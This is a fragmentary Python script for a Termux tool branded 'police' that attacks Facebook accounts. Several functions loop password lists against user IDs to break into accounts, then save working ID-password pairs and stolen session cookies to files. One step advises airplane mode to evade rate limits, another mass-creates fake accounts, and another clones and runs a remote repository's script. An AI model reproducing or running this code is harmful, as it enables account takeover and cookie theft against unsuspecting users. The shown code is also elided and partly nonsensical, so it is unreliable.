...
#────────────(AUTO-CREATE-SETUP)────────────#
print('\x1b[38;5;47m[\x1b[38;5;122m✓\033[1;32m] \033[1;37mJoin facebook Group...')
...
\x1b[1;34m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\x1b[1;34m[\x1b[1;34m+\x1b[1;34m] \033[1;37mFACEBOK : police 
\x1b[1;34m[\033[1;37m+\x1b[1;34m] \033[1;37mGITHUB  : police
\x1b[1;34m[\033[1;37m+\x1b[1;34m] \033[1;37mSERVICE : \x1b[1;34mTIRAKS
\x1b[1;34m\x1b[1;34m+\033[1;32m] \033[1;37mVERSION : \x1b[1;34m0.5
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[\x1b[1;34m+\x1b[1;34m] \033[1;37mCloning ids Saved in🫶 police 🫶folder
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
def clear():
...
def menu():
            clear()
        #    linex()
            print(' \33[37;42m\t Welcome police Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print("\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mpolice Crack Has Been Running \n\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [police-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [police-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/police/police-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [police-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/police/police-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/police/police-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [police-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/police/police-CATOU🍪.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/police/police-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [police-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [police-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/police/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/police/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [police-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/police/police-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex=(f"police~CREATE:{uid}TS{key1}110E==")
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [police-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [police-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/police/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def createip():
	os.system("cd && git clone https://github.com/police03-T/police-0303/tree/main")
	os.system('cd && cd police03_T ;python IP16.py')
####_____END_____###*
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/policekey.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/police.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python police.py')
